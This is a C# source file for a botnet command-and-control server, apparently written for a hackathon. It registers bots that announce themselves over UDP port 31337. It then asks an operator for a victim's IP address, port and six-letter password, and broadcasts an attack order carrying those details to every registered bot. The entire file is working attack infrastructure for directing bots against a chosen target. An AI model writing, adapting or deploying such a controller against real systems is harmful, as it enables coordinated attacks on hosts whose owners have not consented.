using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HackatonCNCServer
{
    class CCServer
    {
        private string _serverName;
        private HashSet<IPEndPoint> _bots;
        private UdpClient listenToBots;

        public string getServerName()
        {
            return _serverName;
        }


        public CCServer(String name)
        {
            _serverName = name;
            _bots = new HashSet<IPEndPoint>();

            listenToBots = new UdpClient(new IPEndPoint(IPAddress.Any, 31337));//listen to broadcasts

            // need to add threads here
            Thread work = new Thread(GetAttackInfo);
            work.Start();
            Thread getBots = new Thread(GetBots);
            Console.WriteLine("Command and control server " + name + " active");
            getBots.Start(); 
        }

        /// <summary>
        /// method to listen to bot attack messages
        /// </summary>
        private void GetAttackInfo()
        {
            while (true)
            {
                Console.Write("Enter IP address to attack: ");
                String ip = Console.ReadLine();

                Console.Write("Enter port number: ");
                String port = Console.ReadLine();

                Console.Write("Enter password: ");
                String password = Console.ReadLine();

                bool validDetails = checkInfo(ip, port, password);
                if (validDetails)
                {
                    Console.WriteLine("Attacking victim on IP " + ip + ", port " + port
                        + ", with " + _bots.Count + " bots");
                    AttackVictim(ip, port, password);
                }
                else
                    continue;
            }
        }

        /// <summary>
        /// method to make sure that all given parameters are valid
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <param name="password"></param>
        /// <returns></returns>
        private bool checkInfo(string ip, string port, string password)
        {
            IPAddress address;
            int portNumber;
            bool isNumeric = false;
            if (!IPAddress.TryParse(ip, out address))
            {
                Console.WriteLine("Illegal IP address");
                return false;
            }

            isNumeric = int.TryParse(port, out portNumber);
            if (!isNumeric || String.IsNullOrEmpty(port))
            {
                Console.WriteLine("Port needs to be a number between 1024 to 65535");
                return false;
            }
            else if (isNumeric && (portNumber < 1024 || portNumber > 65535))
            {
                Console.WriteLine("Port needs to be a number between 1024 to 65535");
                return false;
            }

            if (string.IsNullOrEmpty(password) || password.Length != 6)
            {
                Console.WriteLine("Password needs to contain 6 letter string (a-z)");
                return false;
            }

            for (int i = 0; i < password.Length; i++)
            {
                if (!char.IsLetter(password[i]))
                {
                    Console.WriteLine("Password needs to contain 6 letter string (a-z)");
                    return false;
                }
            }

            return true;
        }


        /// <summary>
        /// method to listen and save bots
        /// </summary>
        public void GetBots()
        {
            while (true)
            {
                try
                {
                    
                    IPEndPoint bot = new IPEndPoint(IPAddress.Any, 0);
                    byte[] portFromBot = listenToBots.Receive(ref bot);
                    if (portFromBot.Length < 2)
                    {
                        // bad
                    }

                    int messagePort;
                    if (BitConverter.IsLittleEndian)
                        messagePort = BitConverter.ToUInt16(portFromBot, 0);
                    else
                        messagePort = BitConverter.ToUInt16(new byte[2] { portFromBot[0], portFromBot[1] }, 0);

                    IPEndPoint botLocation = new IPEndPoint(bot.Address, messagePort);
                    _bots.Add(botLocation);


                    //read from user (IP, port, password)
                    //if details are correct will also attack the victim!
                }
                catch (Exception ex)
                {
                    Console.WriteLine("exception: ", ex);
                }
            }
        }

        /// <summary>
        /// method to attack a chosen victim
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <param name="password"></param>
        private void AttackVictim(string ip, string port, string password)
        {
            IPAddress address = IPAddress.Parse(ip);
            byte[] byteAdress = address.GetAddressBytes();
            ushort portNumber = UInt16.Parse(port);
            byte[] bytePort = BitConverter.GetBytes(portNumber);
            byte[] bytePassword = Encoding.ASCII.GetBytes(password);
            byte[] byteName = Encoding.ASCII.GetBytes(_serverName);
            IPEndPoint victimHost = new IPEndPoint(address, portNumber);

            UdpClient sender = new UdpClient();
            byte[] message = new byte[44];

            for (int i = 0; i < 4; i++)
            {
                message[i] = byteAdress[i];
            }
            for (int i = 4; i < 6; i++)
            {
                message[i] = bytePort[i - 4];
            }

            for (int i = 6; i < 12; i++)
            {
                message[i] = bytePassword[i - 6];
            }

            for (int i = 12; i < message.Length; i++)
            {
                message[i] = byteName[i - 12];
            }

            foreach (IPEndPoint bot in _bots)
            {
                try
                {
                    sender.Send(message, message.Length, bot);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("cant attack with bot" + bot);
                }
                
            }
        }



        static void Main(string[] args)
        {
            CCServer server = new CCServer("HooperShtriechShnekAttackOmriHag");
        }
    }
}
